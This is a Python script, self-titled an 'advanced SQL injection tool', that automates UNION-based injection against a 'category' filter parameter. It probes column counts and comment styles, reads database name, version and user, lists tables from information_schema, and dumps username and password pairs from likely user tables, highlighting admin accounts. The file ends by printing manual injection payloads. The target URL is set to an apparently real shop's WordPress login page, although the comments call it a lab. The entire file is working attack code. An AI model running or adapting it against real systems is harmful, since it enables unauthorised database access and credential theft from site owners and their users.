import requests
import re
from urllib.parse import quote

# Update with your actual lab URL
LAB_URL = "https://dipelectronicslabshop.in/wp-login.php"

def detect_columns():
    """Detect the correct number of columns"""
    print("=" * 70)
    print("DETECTING NUMBER OF COLUMNS")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    # Try different comment styles
    comment_styles = ['-- ', '--+', '#', '/**/']
    
    for comment in comment_styles:
        print(f"\n[*] Trying comment style: {repr(comment)}")
        
        for num_cols in range(1, 10):
            # Build NULL payload
            nulls = ','.join(['NULL'] * num_cols)
            payload = f"' UNION SELECT {nulls}{comment}"
            
            params = {'category': payload}
            
            try:
                response = requests.get(base_url, params=params, timeout=5)
                
                # Check if successful (no error)
                if (response.status_code == 200 and 
                    'error' not in response.text.lower() and
                    'syntax' not in response.text.lower()):
                    print(f"[+] Found working syntax: {num_cols} columns with comment '{comment}'")
                    return num_cols, comment
            except:
                pass
    
    return None, None

def test_text_columns(num_cols, comment):
    """Test which columns can display text"""
    print(f"\n" + "=" * 70)
    print("TESTING TEXT COLUMNS")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    text_columns = []
    
    for col in range(num_cols):
        # Build payload with marker in one column
        values = ['NULL'] * num_cols
        values[col] = "'TEXTTEST'"
        
        payload = f"' UNION SELECT {','.join(values)}{comment}"
        params = {'category': payload}
        
        try:
            response = requests.get(base_url, params=params, timeout=5)
            
            if 'TEXTTEST' in response.text:
                print(f"[+] Column {col + 1} can display text")
                text_columns.append(col)
        except:
            pass
    
    return text_columns

def get_database_info(num_cols, text_col, comment):
    """Get basic database information"""
    print(f"\n" + "=" * 70)
    print("DATABASE INFORMATION")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    # Database queries
    queries = {
        'Database Name': 'DATABASE()',
        'Database Version': 'VERSION()',
        'Current User': 'USER()',
        'MySQL Version': '@@version',
    }
    
    for name, query in queries.items():
        values = ['NULL'] * num_cols
        values[text_col] = query
        
        payload = f"' UNION SELECT {','.join(values)}{comment}"
        params = {'category': payload}
        
        try:
            response = requests.get(base_url, params=params, timeout=5)
            
            if response.status_code == 200:
                # Extract result
                clean_text = re.sub(r'<[^>]+>', ' ', response.text)
                lines = clean_text.split('\n')
                
                for line in lines:
                    line = line.strip()
                    # Look for version patterns or database names
                    if (line and len(line) > 3 and len(line) < 100 and
                        not any(skip in line.lower() for skip in ['select', 'union', 'from'])):
                        if any(indicator in line.lower() for indicator in ['mysql', 'maria', '.', '@', 'database']):
                            print(f"{name}: {line}")
                            break
        except:
            pass

def extract_tables(num_cols, text_col, comment):
    """Extract table names from database"""
    print(f"\n" + "=" * 70)
    print("EXTRACTING TABLES")
    print("=" * 70)
    
    base_url = f"{LAB_URL}/filter"
    
    values = ['NULL'] * num_cols
    values[text_col] = "CONCAT('TBL:',table_name)"
    
    payload = f"' UNION SELECT {','.join(values)} FROM information_schema.tables WHERE table_schema=DATABASE(){comment}"
    params = {'category': payload}
    
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.get(base_url, params=params, timeout=5)
        
        if response.status_code == 200:
            # Look for our marker
            tables = re.findall(r'TBL:([a-zA-Z0-9_]+)', response.text)
            
            if tables:
                print(f"\n[+] Found {len(tables)} tables:")
                for table in sorted(set(tables)):
                    print(f"    - {table}")
                return list(set(tables))
            else:
                print("[-] No tables found with marker method")
                
                # Try without marker
                values[text_col] = "table_name"
                payload = f"' UNION SELECT {','.join(values)} FROM information_schema.tables WHERE table_schema=DATABASE(){comment}"
                params = {'category': payload}
                
                response = requests.get(base_url, params=params)
                
                # Extract potential table names
                clean_text = re.sub(r'<[^>]+>', '\n', response.text)
                lines = clean_text.split('\n')
                
                tables = []
                for line in lines:
                    line = line.strip()
                    if (line and re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', line) and
                        len(line) > 2 and len(line) < 30 and
                        line.lower() not in ['select', 'from', 'union', 'where', 'null']):
                        tables.append(line)
                
                if tables:
                    print(f"\n[+] Found potential tables:")
                    for table in sorted(set(tables)):
                        print(f"    - {table}")
                    return list(set(tables))
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return []

def extract_credentials_from_table(table_name, num_cols, text_col, comment):
    """Extract credentials from a specific table"""
    print(f"\n[*] Extracting from table: {table_name}")
    
    base_url = f"{LAB_URL}/filter"
    
    # First get columns
    values = ['NULL'] * num_cols
    values[text_col] = "CONCAT('COL:',column_name)"
    
    payload = f"' UNION SELECT {','.join(values)} FROM information_schema.columns WHERE table_name='{table_name}'{comment}"
    params = {'category': payload}
    
    columns = []
    try:
        response = requests.get(base_url, params=params)
        cols = re.findall(r'COL:([a-zA-Z0-9_]+)', response.text)
        columns = list(set(cols))
        
        if columns:
            print(f"    Columns: {', '.join(columns)}")
    except:
        pass
    
    # Try common credential extractions
    attempts = [
        ("CONCAT('CRED:',username,':',password)", "username:password"),
        ("CONCAT('CRED:',user,':',password)", "user:password"),
        ("CONCAT('CRED:',email,':',password)", "email:password"),
        ("CONCAT('CRED:',uname,':',pass)", "uname:pass"),
        ("CONCAT('CRED:',login,':',pwd)", "login:pwd"),
    ]
    
    for query, desc in attempts:
        values = ['NULL'] * num_cols
        values[text_col] = query
        
        payload = f"' UNION SELECT {','.join(values)} FROM {table_name}{comment}"
        params = {'category': payload}
        
        try:
            response = requests.get(base_url, params=params, timeout=5)
            
            if 'CRED:' in response.text:
                # Extract credentials
                creds = re.findall(r'CRED:([^:]+):([^<\s]+)', response.text)
                
                if creds:
                    print(f"\n[+] Found credentials using {desc}:")
                    for username, password in creds:
                        print(f"    Username: {username}")
                        print(f"    Password: {password}")
                        print("    " + "-" * 40)
                        
                        if 'admin' in username.lower():
                            print(f"\n[!] ADMIN FOUND: {username} / {password}")
                    return True
        except:
            pass
    
    return False

def try_common_tables(num_cols, text_col, comment):
    """Try extracting from common table names"""
    print(f"\n" + "=" * 70)
    print("TRYING COMMON TABLES")
    print("=" * 70)
    
    common_tables = [
        'users', 'user', 'accounts', 'members', 'customers',
        'admins', 'administrators', 'logins', 'credentials'
    ]
    
    for table in common_tables:
        if extract_credentials_from_table(table, num_cols, text_col, comment):
            return True
    
    return False

def main():
    print("ADVANCED SQL INJECTION TOOL")
    print("=" * 70)
    
    if "YOUR-LAB-ID" in LAB_URL:
        lab_url = input("Enter your lab URL: ").strip()
        globals()['LAB_URL'] = lab_url
    
    # Step 1: Detect columns
    num_cols, comment = detect_columns()
    
    if not num_cols:
        print("\n[-] Could not detect proper SQL injection syntax")
        print("\n[!] Manual testing required. Try these payloads:")
        print("1. ' OR 1=1-- ")
        print("2. ' OR '1'='1")
        print("3. ' UNION SELECT NULL-- ")
        print("4. ' UNION SELECT NULL,NULL-- ")
        print("5. ' UNION SELECT NULL,NULL,NULL-- ")
        return
    
    print(f"\n[+] Injection confirmed: {num_cols} columns, comment: {repr(comment)}")
    
    # Step 2: Find text columns
    text_columns = test_text_columns(num_cols, comment)
    
    if not text_columns:
        print("[-] No text columns found")
        return
    
    # Use first text column
    text_col = text_columns[0]
    
    # Step 3: Get database info
    get_database_info(num_cols, text_col, comment)
    
    # Step 4: Extract tables
    tables = extract_tables(num_cols, text_col, comment)
    
    # Step 5: Extract credentials
    if tables:
        # Try user-related tables first
        user_tables = [t for t in tables if any(keyword in t.lower() for keyword in ['user', 'admin', 'account', 'member', 'login'])]
        
        for table in user_tables:
            if extract_credentials_from_table(table, num_cols, text_col, comment):
                break
    else:
        # Try common table names
        print("\n[*] No tables found via information_schema, trying common names...")
        try_common_tables(num_cols, text_col, comment)
    
    # Provide manual queries
    print(f"\n" + "=" * 70)
    print("MANUAL QUERIES TO TRY")
    print("=" * 70)
    
    values = ['NULL'] * num_cols
    values[text_col] = "YOUR_QUERY"
    template = f"' UNION SELECT {','.join(values)}{comment}".replace('YOUR_QUERY', '{}')
    
    print(f"\nTemplate for {num_cols} columns (text in column {text_col + 1}):")
    print(f"{template}")
    
    print("\nExample queries:")
    print(f"1. List tables: {template.format('table_name')} FROM information_schema.tables WHERE table_schema=DATABASE()")
    print(f"2. List columns: {template.format('column_name')} FROM information_schema.columns WHERE table_name='users'")
    print(f"3. Extract data: {template.format('CONCAT(username,\":\",password)')} FROM users")

if __name__ == "__main__":
    main()